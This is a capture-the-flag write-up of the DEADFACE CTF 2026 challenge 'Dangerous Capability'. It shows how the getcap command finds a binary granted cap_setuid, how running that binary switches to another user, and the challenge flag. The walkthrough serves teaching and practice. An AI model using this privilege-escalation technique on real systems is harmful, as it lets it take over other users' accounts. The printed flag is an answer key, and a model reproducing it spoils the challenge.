---
title: Dangerous Capability
tags:
  - DEADFACE CTF 2026
  - Exploitation
  - Linux
  - Forensics
---

# Dangerous Capability

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Hostbusters · Forensics / Linux priv-esc |
| **Points** | 300 |
| **Author** | @syyntax |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> `lilith` did OSINT correlation for the op and left some "crypto tooling" lying around `charon`. One of those tools was granted a Linux capability it should never have had.
>
> Use it to become the next user and read their flag.
>
> Submit the flag as `deadface{flag-text}`.

Access: `https://hostbusters.dctf.io/` (continuing from [Lilith](lilith.md))

## Solution

### 1. Enumerating Linux file capabilities

Scanning the filesystem on `charon` for binaries with Linux capabilities (`getcap -r / 2>/dev/null`) surfaces `/opt/crypto/cryptctl`:

```bash
getcap -r / 2>/dev/null
# /opt/crypto/cryptctl cap_setuid=ep
```

### 2. Escalating to `spookyboi`

`/opt/crypto/cryptctl` is granted **`cap_setuid=ep`** (effective and permitted `CAP_SETUID`), allowing it to change process UIDs. Running `/opt/crypto/cryptctl` switches the execution context to **`spookyboi`** (`uid=1006`), letting us read `/home/spookyboi/flag.txt`:

```bash
/opt/crypto/cryptctl
id
# uid=1006(spookyboi) ...
cat /home/spookyboi/flag.txt
```

```text
deadface{c4p_s3tu1d_cuts_d33p}
```

*(Note the digit `1` in `s3tu1d` rather than the letter `i`.)*

## Flag

!!! flag "Flag"
    `deadface{c4p_s3tu1d_cuts_d33p}`

## Takeaways

File capabilities (`getcap -r / 2>/dev/null`) are a stealthy alternative to SUID bits because they do not show up in `find / -perm -4000`. Any binary with `cap_setuid=ep` can arbitrarily change its effective UID to impersonate other accounts on the machine.
